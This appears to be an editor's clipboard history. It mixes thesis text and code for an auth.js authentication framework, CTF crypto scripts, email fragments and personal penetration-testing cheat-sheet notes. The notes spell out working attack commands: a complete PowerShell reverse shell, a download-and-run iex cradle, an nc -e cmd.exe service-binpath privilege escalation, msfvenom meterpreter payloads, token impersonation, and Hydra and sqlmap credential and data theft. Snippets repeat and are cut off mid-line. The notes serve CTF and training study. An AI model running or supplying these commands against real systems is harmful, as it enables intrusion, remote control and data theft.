	pt = n.to_bytes((n.bit_length() + 7) // 8, 'big').decode()
	print(pt)
04c475166a958e2e5573ca4563f4e101|untitled:1|13|15|v|python
	bin(ord(c)-ord('2')+27)[2:].zfill(5)
028af30673deff5952eea359632e19ad|untitled:1|8|1|V|python
	print(bin(ord(big) - ord(small))[2:].zfill(5))
8704309fa8d9e1ae476b37835b5e6278|untitled:1|23|1|V|python
	# dec = ''
	# for i in range(0, len(pt), 8):
	#     dec += 
f46597826bf5e6dd39f8d0b35767d14e|untitled:1|23|19|v|python
	[pt[i:i+n]
9f94942161b5a3fe4455c2d105f9e7bb|untitled:1|23|19|^v|python
	[pt[i:i+n] for i in range(0, len(pt), n)]
4c942f73b3ae949ac69ef5b3e3dbae77|untitled:1|7|26|V|python
	print(ord(big)-ord(small))
	print(bin(ord(big) - ord(small))[2:].zfill(5))
	print(bin(ord('3')-ord('3')+27)[2:].zfill(5))
89ce5227d45ae977c0b851c7c1c7a1f3|untitled:1|1|1|V|python
	def bits2string(b=None):
	    return ''.join([chr(int(x, 2)) for x in b])
	
05d1336bdd502d0ec82b48bfa18a3dfd|file:///home/neo/Documents/diplomatiki/auth.js/introduction.tex|24|10|v|tex
	 them. 
26cae7718c32180a7a0f8e19d6d40a59|file:///tmp/neomutt-neo-1000-3107-4954049850508360270|5|52|v|mail
	facebook
7e7aac930123145f5f0af775ca3e1c58|file:///tmp/neomutt-neo-1000-3107-4954049850508360270|4|58|v|mail
	maybe
afd504e668be3e43969728ac4b2151e1|file:///tmp/neomutt-neo-1000-3107-4954049850508360270|6|1|V|mail
	"However, if a user‚Äôs identity-provider account is compromised or
	unavailable, or if she simply chooses to close her identity provider
	account, then the security or availability of her
	relying-party accounts can be impacted. In addition, the
	identity provider in these schemes typically learns the relying
	parties visited by the user . Such issues have slowed their adoption."
	
9763b5c40efb184a78f39fd54b5f5d12|file:///tmp/neomutt-neo-1000-3107-4954049850508360270|2|28|v|mail
	, but I can't really find something relevant
d76392631e5d9933f0807afae04e7c73|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|170|1|V|tex
	\begin{lstlisting}[language=PHP,caption={The {\tt check\_public\_key} function that verifies the submitted signature using the user's stored public key}, label={lst:check_public_key}]
	        // Get the original value of the nonce from the cookie, so we can verify the signature
	        $message = $_COOKIE["nonce-message"];
	        // Extract the public key an signature
	        $public_key = substr($credentials, 0, 64);
	        $signature = substr($credentials, 64);
	        ...
	        // Check if the hash of the sent public key matches the stored hash
	        $check = hash_equals( $stored_pk, md5( $public_key ) );
	        ...
	        // Run python script to verify signature //
	        ...
	        return apply_filters( 'check_password', $check, $credentials, $stored_pk, $user_id );
	        }
	\end{lstlisting}
33b33c61a58347c1a7037d4e157a44f9|file:///home/neo/Documents/diplomatiki/auth.js/abstract.tex|3|1|V|tex
	Several research works attempt to replace simple authentication schemes, where
	the cryptographic digest of a plaintext password is stored at the server. Those
	proposals are based on more elaborate schemes, such as PAKE-based protocols.
	However, in practice, only a very limited amount of applications in the web use
	such schemes. The reason for this limited deployment is perhaps 
	their complexity as far as the cryptography involved is concerned.
	Today, even the most successful web applications use text-based
	passwords, which are simply hashed and stored at the server. This has broad implications
	for both the service and the user. Essentially, the users are forced to reveal
	their plain passwords for both registering and authenticating with a service.
	
	In this paper, we attempt to make it easier for any web service to a) enable
	easily advanced authentication schemes, and b) switch from one scheme to
	another.  More precisely, we design and realize {\tt auth.js}, a framework that
	allows a web application to offer advanced authentication that leverages
	sophisticated techniques compared to typical cryptographically hashed
	text-based passwords. In fact, {\tt auth.js} can be easily enabled in all web
	applications and supports traditional passwords -- however, once enabled,
	switching to a more elaborate scheme is straight forward. {\tt auth.js}
	leverages advanced cryptographic primitives, which can be used for implementing
	strong authentication, such as PAKE and similar solutions, by ensuring that all
	cryptographic primitives are trusted and executed using the browser's engine. For
	this, we extend Mozilla Crypto with more cryptographic primitives, such as {\tt
	scrypt} and the edwards25519 elliptic curve. Finally, we evaluate {\tt auth.js}
	with real web applications, such as WordPress.
b366fff768d8bb596667af065334437a|file:///home/neo/Documents/diplomatiki/auth.js/paper.tex|45|13|v|tex
	auth.js:
78948c16bfa1e4b6f279a4f5be17960a|file:///home/neo/Documents/diplomatiki/auth.js/paper.tex|45|13|v|tex
	auth.js:} Advanced Authentication for the Web }
37c3450b6618a349e4890dcafff6b505|file:///home/neo/Documents/diplomatiki/auth.js/introduction.tex|24|82|v|tex
	advanced
2d7321bb1faf2111961e89a46c80462f|file:///home/neo/Documents/diplomatiki/auth.js/paper.bib|37|1|V|bib
	@misc{keybase-login,
	  title = {Keybase.io login API documentation},
	  howpublished = {\url{https://keybase.io/docs/api/1.0/call/login}}
	}
572efc1e90edf8647fcd2313a5633b85|file:///home/neo/Documents/diplomatiki/auth.js/paper.bib|2|11|^v|bib
	Hardt, D., Ed.,
e84e1338162a83edaa03627a20c28a01|file:///home/neo/Documents/diplomatiki/auth.js/paper.bib|5|28|v|bib
	 Yakov Rekhter and Tony Li
97529e83fb1b0f5ac86467b76a84305f|file:///home/neo/Documents/diplomatiki/auth.js/paper.bib|2|13|v|bib
	The OAuth 2.0 Authorization Framework
649296869221914ee81043ef1f3fc329|file:///home/neo/Documents/diplomatiki/auth.js/paper.bib|6|52|v|bib
	 A Border Gateway Protocol 4 (BGP-4)
3dd49c6a7d6b5cc3c302478cdbe0a61a|file:///home/neo/Documents/diplomatiki/auth.js/paper.bib|10|4|V|bib
	   PAGES = {1-56},
1b539f6f34e8503c97f6d3421346b63c|file:///home/neo/Documents/diplomatiki/auth.js/paper.bib|11|13|v|bib
	July
a6ce20fd94fad96fd83d59d1d4201c92|file:///home/neo/Documents/diplomatiki/auth.js/paper.bib|2|63|v|bib
	https://www.rfc-editor.org/info/rfc6749
c6058ae7ce7411784e0ef4179693fe71|file:///home/neo/Documents/diplomatiki/auth.js/paper.bib|15|9|v|bib
	https://www.rfc-editor.org/rfc/rfc1654.txt 
94ce5b2b742c6084f2589aff9781b744|file:///home/neo/Documents/diplomatiki/auth.js/paper.bib|12|4|V|bib
	   ISSN = {2070-1721},
961dc9f25c40f03537d07ca2ea59eabe|file:///home/neo/Documents/diplomatiki/auth.js/paper.bib|2|1|V|bib
	[RFC6749]  "", RFC 6749, DOI 10.17487/RFC6749, October 2012, <https://www.rfc-editor.org/info/rfc6749>.
aaabf0d39951f3e6c3e8a7911df524c2|file:///home/neo/Documents/diplomatiki/auth.js/introduction.tex|27|1|v|tex
	service
be3f2ab62f146362dd4418143595be41|file:///home/neo/Documents/diplomatiki/auth.js/paper.bib|1|2|v|bib
	techreport
ddedeaa3dcde160e953b07c87fd9d682|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|184|1|V|tex
	The {\tt check\_public\_key} function is added in the {\tt pluggable.php} file. Listing~\ref{lst:check_public_key} shows how {\tt check\_public\_key} verifies that the submitted signature is correct. In particular, it parses the received credentials to get the public key and signature values and checks if the hash of the public key submitted by the user matches the stored public key hash. Then, it uses the submitted signature along with the Ed25519 public key and the original nonce value to verify the signature. We implemented this check as an external Python script, which uses the PyNaCl library to verify that the given signature is correct. After the signature is verified, the user is successfully logged in.
	
4217cdcd480169e41db92b734336e4f1|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|29|1|V|tex
	    ...
593bee1c622c5a1b877ba4db4a799256|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|168|1|V|tex
	        // Extract the public key an signature
369fbcfa3e55a38a578e23b37612db03|file:///home/neo/Documents/diplomatiki/auth.js/implementation.tex|170|25|v|tex
	hash of the sent public key matches the stored hash
03797077d4fcf091f1f00b311040bf60|file:///home/neo/CTFs/asis2020/baby_rsa/baby_rsa.py|3|1|V|python
	from Crypto.Util.number import *
	import random
6f03c116b8a0278d2293c4fb8972faef|file:///home/neo/CTFs/asis2020/baby_rsa/baby_rsa.py|7|1|V|python
	nbit = 512
	while True:
		p = getPrime(nbit)
		q = getPrime(nbit)
		e, n = 65537, p*q
		phi = (p-1)*(q-1)
		d = inverse(e, phi)
		r = random.randint(12, 19)
		if (d-1) % (1 << r) == 0:
			break
	
	s, t = random.randint(1, min(p, q)), random.randint(1, min(p, q))
	t_p = pow(s*p + 1, (d-1)/(1 << r), n)
	t_q = pow(t*q + 4, (d-1)/(1 << r), n)
	
	print 'n =', n
	print 't_p =', t_p
	print 't_q =', t_q
	print 'enc =', pow(bytes_to_long(flag), e, n)
e0e800e3149789da750651e707ff6355|file:///home/neo/CTFs/asis2020/web-warmup/PHPFuck/cat_flag|1|1|V|
	
33171cfbb705e3cd27eef467d8473053|file:///home/neo/CTFs/asis2020/baby_rsa/output.txt|1|5|v|text
	10594734342063566757448883321293669290587889620265586736339477212834603215495912433611144868846006156969270740855007264519632640641698642134252272607634933572167074297087706060885814882562940246513589425206930711731882822983635474686630558630207534121750609979878270286275038737837128131581881266426871686835017263726047271960106044197708707310947840827099436585066447299264829120559315794262731576114771746189786467883424574016648249716997628251427198814515283524719060137118861718653529700994985114658591731819116128152893001811343820147174516271545881541496467750752863683867477159692651266291345654483269128390649
e8431065d00a37f6e7523cc1e3f269da|file:///home/neo/CTFs/asis2020/baby_rsa/baby_rsa.py|20|7|v|python
	pow(t*q + 4, (d-1)/(1 << r), n)
d52e15ceccdae7ccfeb627fb52b00e55|file:///home/neo/CTFs/asis2020/baby_rsa/baby_rsa.py|19|7|v|python
	pow(s*p + 1, (d-1)/(1 << r), n)
833c4109b23713482bfb29f1cc174182|file:///home/neo/CTFs/asis2020/baby_rsa/baby_rsa.py|7|1|V|python
	nbit = 512
	while True:
		p = getPrime(nbit)
		q = getPrime(nbit)
		e, n = 65537, p*q
		phi = (p-1)*(q-1)
		d = inverse(e, phi)
		r = random.randint(12, 19)
		if (d-1) % (1 << r) == 0:
			break
	
	s, t = random.randint(1, min(p, q)), random.randint(1, min(p, q))
	t_p = pow(s*p + 1, (d-1)/(1 << r), n)
	t_q = pow(t*q + 4, (d-1)/(1 << r), n)
	
	print 'n =', n
	print 't_p =', t_p
	print 't_q =', t_q
64a83f54e5be7bb03134fcf8a6dea9a5|file:///home/neo/CTFs/asis2020/baby_rsa/baby_rsa.py|7|1|V|python
	nbit = 512
	while True:
		p = getPrime(nbit)
		q = getPrime(nbit)
		e, n = 65537, p*q
		phi = (p-1)*(q-1)
		d = inverse(e, phi)
		r = random.randint(12, 19)
		if (d-1) % (1 << r) == 0:
			break
	
	s, t = random.randint(1, min(p, q)), random.randint(1, min(p, q))
	t_p = pow(s*p + 1, (d-1)/(1 << r), n)
	t_q = pow(t*q + 4, (d-1)/(1 << r), n)
05e00e62764b09a19b9878164679e6f6|untitled:1|3|27|v|
	@@@@@@@@@@@@@<@@@@@@
563bfefa97c1ce10cf6a28a11b2bfa0f|untitled:1|3|21|v|
	")'^('@@@@@@@@@@@@@<@@@@@@'))
a25557af06f8d7fe1d19a80e6f573e54|untitled:1|3|1|V|
	('2%!$&),%("&,![.0(0")'^'@@@@@@@@@@@@@<@@@@@@')
eeb5e98efe50d4599df60f594add5a25|untitled:1|3|1|V|
	'2%!$&),%("&,![.0(0")'^'@@@@@@@@@@@@@<@@@@@@'
b6d24108d3b8ae3aca8afb9c27f1dc6a|untitled:1|3|3|v|
	2%!$&),%("&,![.0(0")
5b336c3a7833acb9e86a4a0b57a24c16|untitled:1|3|1|V|
	('2%!$&),%("&,![.0(0")'^'@@@@@@@@\x00\x00@@@<@\x00@@@\x00\x00')
8b97981d543a7fc0c5573e3ee2261515|file:///home/neo/vimwiki/Enumeration%20%26%20Foothold.wiki|49|28|v|vimwiki
	 (mount on own file system)
4de63dbe5baf4f46cb8059d4951ba666|file:///home/neo/tryhackme/advert-of-cyber/day16.py|5|5|V|python
	    print(f)
3135f275cb76e7ed0a5d327aa520efee|file:///home/neo/tryhackme/advert-of-cyber/day16.py|8|1|V|python
	files = ["./day16_extracted/"]
	vers = 0
	with exiftool.ExifTool() as et:
	    metadata = et.get_metadata_batch(files)
	for d in metadata:
	    if "Version: 1.1" in d:
	        vers += 1
	    if "password" in d:
	        print(metadata)
	
	print("Versions:", vers)
1ea0dbc64bfb8ab986ec5e469793b1aa|file:///home/neo/tryhackme/advert-of-cyber/day16_extracted/metadata.py|10|1|V|python
	    if "password" in d:
	        print(metadata)
ed9f4b8f879ddbb59fda1057ea3a2810|file:///home/neo/tryhackme/advert-of-cyber/metadata.py|3|1|V|python
	import os
02ba63373cfa8772c62b41852b5f79ba|file:///home/neo/tryhackme/advert-of-cyber/metadata.py|5|1|V|python
	files = ["./day16_extracted"]
5ff3cd17e2395092ed43b0bf6804442f|file:///home/neo/tryhackme/advert-of-cyber/metadata.py|5|1|V|python
	print(files)
fe58a3e0223990f6b5e4a178aa588e46|file:///home/neo/tryhackme/advert-of-cyber/metadata.py|5|1|V|python
	vers = 0
d1035635a52e1a28595f1d719e14974d|file:///home/neo/tryhackme/advert-of-cyber/metadata.py|4|1|V|python
	    with open(os.path.join(os.cwd(), filename), 'r') as files:
1a9fb5a08f1c4080b9cbb8b6a732a20a|file:///home/neo/tryhackme/advert-of-cyber/metadata.py|11|24|v|python
	"Version:
b6d5b57aeb7fce9b8c425121012bd2ee|file:///home/neo/vimwiki/Radare2.wiki|4|1|V|vimwiki
	* Disassemble function: `pdf@function`
d39d5a67ea5a640d489a7bb07fa3e4ce|file:///home/neo/vimwiki/Radare2.wiki|12|1|V|vimwiki
	* View registers: `dr`
4351cfebe4b61d8aa5efa1d020710005|file:///home/neo/vimwiki/Enumeration%20%26%20Foothold.wiki|67|11|v|vimwiki
	View
acc5ae64bc6a7e408d78bea8e660f65f|file:///home/neo/vimwiki/Enumeration%20%26%20Foothold.wiki|77|5|V|vimwiki
	    * ``
c38fb0f7b1f8bc9987ff6747d8f17b9c|file:///home/neo/vimwiki/Windows.wiki|9|1|V|vimwiki
	== Reverse shells == 
	    * Powershell
	        * `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`
	        * Download Invoke-PowershellTcp from nishang scirpt and then: `powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:webserver-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port`
5760b45f259edeb3aa3a9d46185d4086|file:///home/neo/vimwiki/Windows.wiki|31|1|V|vimwiki
	== Powershell commands ==
	    * Transfer files from local to Windows: [ https://blog.ropnop.com/transferring-files-from-kali-to-windows/ ]
	        * Http:
	            - Put file in /var/www/html
	            - Start http server (`python -m SimpleHTTPServer`)
	            - `(new-object System.Net.WebClient).DownloadFile('http://10.9.122.8/met8888.exe','C:\Users\jarrieta\Desktop\met8888.exe')` 
	            - Or better: `powershell -c "Invoke-WebRequest -OutFile filename http://ipaddr/filename"`
	        * Ftp:
	            - Metasploit: auxiliary/server/ftp
	            - ftproot: path that contains file
	            - echo following into file: (`echo 'text' >> ftp_commands.txt`)
	                open 10.9.122.8
	                anonymous
	                whatever
	                binary
	                get file.exe
	                bye
	            - `ftp -s:ftp_commands.txt`
	             
	    * Unzip: `Expand-Archive file.zip`
	    * Search for file: `dir filename \s \p`
	    * Display file contents: `type filename`
	    * Stop and start services: `sc stop/start servicename`
	    * View privileges: `whoami /priv`
	
531b84ad41b2a753da83acf367990701|file:///home/neo/vimwiki/Powershell.wiki|2|4|v|vimwiki
	Powershell
fc41387344bcd35ec42d1d3022b4006d|file:///home/neo/vimwiki/Windows.wiki|10|1|V|vimwiki
	== Reverse shells == 
	    * Powershell
	        * `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`
	        * Download Invoke-PowershellTcp from nishang scirpt and then: `powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:webserver-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port`
	
0e51edcd7f81f9023e7136a9eef600da|file:///home/neo/vimwiki/Windows.wiki|33|12|V|vimwiki
	== Powershell commands ==
	    * Transfer files from local to Windows: [ https://blog.ropnop.com/transferring-files-from-kali-to-windows/ ]
	        * Http:
	            - Put file in /var/www/html
	            - Start http server (`python -m SimpleHTTPServer`)
	            - `(new-object System.Net.WebClient).DownloadFile('http://10.9.122.8/met8888.exe','C:\Users\jarrieta\Desktop\met8888.exe')` 
	            - Or better: `powershell -c "Invoke-WebRequest -OutFile filename http://ipaddr/filename"`
	        * Ftp:
	            - Metasploit: auxiliary/server/ftp
	            - ftproot: path that contains file
	            - echo following into file: (`echo 'text' >> ftp_commands.txt`)
	                open 10.9.122.8
	                anonymous
	                whatever
	                binary
	                get file.exe
	                bye
	            - `ftp -s:ftp_commands.txt`
	             
	    * Unzip: `Expand-Archive file.zip`
	    * Search for file: `dir filename \s \p`
	    * Display file contents: `type filename`
	    * Stop and start services: `sc stop/start servicename`
	    * View privileges: `whoami /priv`
c93f70575585f0c9e6341761dc93890a|file:///home/neo/vimwiki/Windows.wiki|10|1|V|vimwiki
	== Privilage escalation ==
cf38d6fee8eed7d1f68e8c1ceaf02dc0|file:///home/neo/vimwiki/Windows.wiki|10|1|V|vimwiki
	    * Run winpeas to find vulnerabilities [ https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe ] 
	    * General tips [ https://book.hacktricks.xyz/windows/windows-local-privilege-escalation ]
	    * Windows access tokens: 
	        * [ https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens ]
	        * [ https://www.exploit-db.com/papers/42556 ]
	        * Use incognito metasploit module:
	            * `use incognito`
	            * `list_tokens -g`
	            * `impersonate_token <token>` (find administrator token) 
	            * Migrate to system process (e.g. services.exe) `migrate process-pid` (find with `ps`)
e8a26dcc830386646643b80ab340e8d2|file:///home/neo/vimwiki/Windows.wiki|11|1|V|vimwiki
	=== Weak service permissions === 
	    * Find services we can modify with winpeas
	    * [ https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services ]
	    * `sc config <Service_Name> binpath= "C:\path_to_nc\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"`
	    (or full path of sc, e.g. C:\Windows\System32\sc.exe) + download nc if necessary
	    * Restart the service:
	       `wmic service NAMEOFSERVICE call startservice`
	       `net stop [service name] && net start [service name]`
	    * Can execute any program as admin (not just nc)
	    * Services log in `C:\Windows\Program Files (x86)\service\events`
	     
3ce22908502a3a1475057a8e5135211e|file:///home/neo/vimwiki/Windows%20PrivEsc.wiki|14|1|V|vimwiki
	        * 
8acb12fa6c2ad755d0a42b623dbd24b8|file:///home/neo/vimwiki/Windows.wiki|11|1|V|vimwiki
	== Privilage escalation ==
	    * Run winpeas to find vulnerabilities [ https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe ] 
	    * General tips [ https://book.hacktricks.xyz/windows/windows-local-privilege-escalation ]
	    * Windows access tokens: 
	        * [ https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens ]
	        * [ https://www.exploit-db.com/papers/42556 ]
	        * Use incognito metasploit module:
	            * `use incognito`
	            * `list_tokens -g`
	            * `impersonate_token <token>` (find administrator token) 
	            * Migrate to system process (e.g. services.exe) `migrate process-pid` (find with `ps`)
	            
	=== Weak service permissions === 
	    * Find services we can modify with winpeas
	    * [ https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services ]
	    * `sc config <Service_Name> binpath= "C:\path_to_nc\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"`
	    (or full path of sc, e.g. C:\Windows\System32\sc.exe) + download nc if necessary
	    * Restart the service:
	       `wmic service NAMEOFSERVICE call startservice`
	       `net stop [service name] && net start [service name]`
	    * Can execute any program as admin (not just nc)
	    * Services log in `C:\Windows\Program Files (x86)\service\events`
6665652364930ac63c594ddccb9decf0|file:///home/neo/vimwiki/Linux.wiki|10|1|V|vimwiki
	== Privilege escalation ==
d7f0d6279f968de593ba4943c598a5d0|file:///home/neo/vimwiki/Linux.wiki|10|1|V|vimwiki
	    * Possible targets:
	        * SUID binaries
	        * Cronjobs
	        * PATH variable
	        * Writable files
	    * Find suid binaries: `find / -perm -4000 2>/dev/null`
	    
	    * [ https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md ] 
	    * [ https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md ] 
	    * [ https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html ]
	    * [ https://payatu.com/guide-linux-privilege-escalation ]
cf93c19b554169bebea5f8d72e088cb7|file:///home/neo/vimwiki/General.wiki|2|1|V|vimwiki
	
	=== Links === 
	    * Reverse shell cheat sheet [ https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md ]
	    * General tips:
		* [ https://github.com/swisskyrepo/PayloadsAllTheThings ]
		* [ https://medium.com/@gregIT/exploiting-simple-network-services-in-ctfs-ec8735be5eef ] 
		* [ https://attack.mitre.org/techniques/T1210/ ]
		* [ https://www.nextgov.com/cybersecurity/2019/10/nsa-warns-vulnerabilities-multiple-vpn-services/160456/ ]
	
	=== Get TTY === 
	    * Python: `python -c 'import pty; pty.spawn("/bin/bash")'`
	    * Netcat: 
	        - Get shell with nc (`nc -lvp port`)
	        - `SHELL=/bin/bash script -q /dev/null`
	        - send to bg (Ctrl-Z)
	        - `stty raw -echo`
	        - `fg`
	        - `reset`
	        - `xterm`
	
	=== Password Cracking ===
	
	* John commands:
	    * Crack password (sha1): `sudo john --fork=4 --format=raw-sha1 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt`
	    * Show cracked password: `sudo john --show hash.txt`
	
	== Listeners ==
	    * TCPdump listener for ICMP traffic: `sudo tcpdump ip proto \\icmp -i interface(tun0)`
	
	== Encryption == 
	* Generate AES key: `openssl genrsa -aes256 -out private.key 8912`
	* Generate public key: `openssl rsa -in private.key -pubout -out public.key`
	* Encrypt with public key: `openssl rsautl -encrypt -pubin -inkey public.key -in plaintext.txt -out encrypted.txt`
	* Decrypt with private key: `openssl rsautl -decrypt -inkey private.key -in encrypted.txt -out plaintext.txt`
	
	== Jenkins ==
	* Run arbitrary command: Project -> Configure -> execute command -> Save -> Build
c246eb91ce4befec967c42997e27c15e|file:///home/neo/vimwiki/Enumeration%20%26%20Foothold.wiki|2|1|V|vimwiki
	== General ==
18a86cb9ebfce0385febab6111061d6e|file:///home/neo/vimwiki/Enumeration%20%26%20Foothold.wiki|6|1|V|vimwiki
	== Nmap ==
06ed07c0acb55a8bd761eee188a22596|file:///home/neo/vimwiki/Enumeration%20%26%20Foothold.wiki|6|1|V|vimwiki
	* [ https://highon.coffee/blog/nmap-cheat-sheet/ ]
	* Usually first:
	    - `nmap -p 1-65535 -sV -sS -T4 target`
	    - Full TCP port scan using with service version detection 
	* Scripts:
	    * Smb enumeration: `--script=smb-enum-shares.nse,smb-enum-users.nse`
	    * Nfs enumeration: `--script=nfs-ls,nfs-statfs,nfs-showmount`
92fc25846006a408d7a9895feef09b82|file:///home/neo/vimwiki/Enumeration%20%26%20Foothold.wiki|8|1|V|vimwiki
	== Directory scanning == 
958e40bc909f1c991e1b3ddb57bd4e84|file:///home/neo/vimwiki/Enumeration%20%26%20Foothold.wiki|8|1|V|vimwiki
	* `gobuster dir -u target -w /usr/share/wordlists/dirb/common.txt`
ed8bee6f22e01babe13ac1ec0dcf76c7|file:///home/neo/vimwiki/Enumeration%20%26%20Foothold.wiki|10|1|V|vimwiki
	== Online credentials brute forcing == 
ebf5de45bdbc6ee6a7f4cc3402ba0f48|file:///home/neo/vimwiki/Enumeration%20%26%20Foothold.wiki|9|1|V|vimwiki
	* Hydra:
	    * HTTP basic: `hydra -l username -P passwordfile -s port -f ipaddr request_method(e.g http-get) /path`
	    * SSH: `hydra -l <username> -P <passfile> <ip> -t 4 ssh`
	    * Post web form: `hydra -l <username> -P <password list> <ip> http-post-form "/<login url>:username=^USER^&password=^PASS^:F=errormsg" -V`
	    * Remote Desktop: `hydra -t 1 -V -f -l <username> -P <wordlist> rdp://<ip>`
44408b84957d4a2537fb223d2f9324a4|file:///home/neo/vimwiki/Enumeration%20%26%20Foothold.wiki|9|1|V|vimwiki
	Scan directory for known vulnerabilities
4db6db48a39e408e739856bd648bd6f3|file:///home/neo/vimwiki/Enumeration%20%26%20Foothold.wiki|9|1|V|vimwiki
	* Nikto:
	    * `nikto -host URL -id username:password -port port`
	    * [ https://redteamtutorials.com/2018/10/24/nikto-cheatsheet/ ]
2df4b941203c38027d12967357778eee|file:///home/neo/vimwiki/Enumeration%20%26%20Foothold.wiki|9|1|V|vimwiki
	== Create payloads ==
3bf4c05587079b59468c2cff6dacb96a|file:///home/neo/vimwiki/Enumeration%20%26%20Foothold.wiki|9|1|V|vimwiki
	* Msfvenom:
	    * `msfvenom -p payload -LHOSTS ipaddr -LPORT port -f filetype`
	    * [ https://redteamtutorials.com/2018/10/24/msfvenom-cheatsheet/ ]
	    * Windows meterpreter: `msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe` and in metasploit: `use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST your-ip set LPORT listening-port run`, `Start-Process shell.exe` to run
bf0d9e6b82bc4cbdebaea4e025d7c4b9|file:///home/neo/vimwiki/Enumeration%20%26%20Foothold.wiki|11|1|V|vimwiki
	
	* User inputs commands
	* Application filter allowed commands
	* User input passed to command
b8912f3c605ad30da395521158e3b7c7|file:///home/neo/vimwiki/Enumeration%20%26%20Foothold.wiki|10|1|V|vimwiki
	== Command injection == 
b41d58a6bd0ea00826625dc4f200dee9|file:///home/neo/vimwiki/Enumeration%20%26%20Foothold.wiki|11|1|V|vimwiki
	== SMB ==
39bee196037bac32aa8fccbaf8e210f1|file:///home/neo/vimwiki/Enumeration%20%26%20Foothold.wiki|11|1|V|vimwiki
	    * Scan with `enum4linux -A ip`
	    * Commands:
	        * Download file locally: `get filename`
	        * Get files recursively: `smbget -R smb://<ip>/anonymous`
	    * Possible attack vectors:
	        * [ https://www.cvedetails.com/cve/CVE-2017-7494/ ]
19055a7b157cf3264025e883d03e6e80|file:///home/neo/vimwiki/Enumeration%20%26%20Foothold.wiki|11|1|V|vimwiki
	    * Scan with `enum4linux -A ip`
	    * Commands:
	        * Download file locally: `get filename`
	        * Get files recursively: `smbget -R smb://<ip>/anonymous`
	    * Possible attack vectors:
	        * [ https://www.cvedetails.com/cve/CVE-2017-7494/ ]
	        * Anonymous share access: `smbclient //ip/share (-U user -P port)`
7dad16437bd3a46f5fb4acc59a6374cf|file:///home/neo/vimwiki/Enumeration%20%26%20Foothold.wiki|12|1|V|vimwiki
	== FTP ==
b633b7ad1273d905aa981a352c436eef|file:///home/neo/vimwiki/Enumeration%20%26%20Foothold.wiki|12|1|V|vimwiki
	* Anonymous login
	    * `ftp ipaddr`
	    * Name: `anonymous`
	    * No password
	* Brute force pass with hydra: `hydra -t 4 -l username -P wordlist -vV ipaddr ftp`
	* CWD exploit: [ https://www.exploit-db.com/exploits/20745 ]
	* ProFTPd:
	    * Version 1.3.5 mod_copy module vulnerability:
	        * Copy file with `SITE CPFR <initial-path>` -> `SITE CPTO <new_path>`
	        * Can move file to an accessible location (e.g. nfs mount)
d830dadae229aecc44d218c5c4e97852|file:///home/neo/vimwiki/Enumeration%20%26%20Foothold.wiki|13|1|V|vimwiki
	== NFS ==
26d9244048540c624d21fc7c007ca45d|file:///home/neo/vimwiki/Enumeration%20%26%20Foothold.wiki|13|1|V|vimwiki
	* Publicly available shares
	    * Check if shares are available: `showmount -e ipaddr`
	    * If shares available: `mount ip:/file/path /local/file/path`
	    * `unmount /local/file/path`
3b84d1f9aa4f1fed3b65e7d478859b7d|file:///home/neo/vimwiki/Enumeration%20%26%20Foothold.wiki|14|1|V|vimwiki
	== SQLi ==
0e367182424edb2f89e36df79d74563f|file:///home/neo/vimwiki/Enumeration%20%26%20Foothold.wiki|14|1|V|vimwiki
	* SQLmap:
	    * Post request:
	        * Get request packet from burp and save to file
	        * `sqlmap -r <request-file> --current-db`
	        * Find tables: `-D <db_name> --tables`
	        * Find columns: `-D <db_name> -T <table_name> --columns`
	        * Table contents: `-D <db_name> -T <table_name> -C <columns_names> --dump`
d39b49d452318866c5444bc649df370c|file:///home/neo/vimwiki/Enumeration%20%26%20Foothold.wiki|15|1|V|vimwiki
	== MySQL ==
4d0ef42e5171e33bc17b822c24c60b77|file:///home/neo/vimwiki/Enumeration%20%26%20Foothold.wiki|15|1|V|vimwiki
	* [ https://gist.github.com/hofmannsven/9164408 ]
	* [ https://gist.github.com/bradtraversy/c831baaad44343cc945e76c2e30927b3 ]
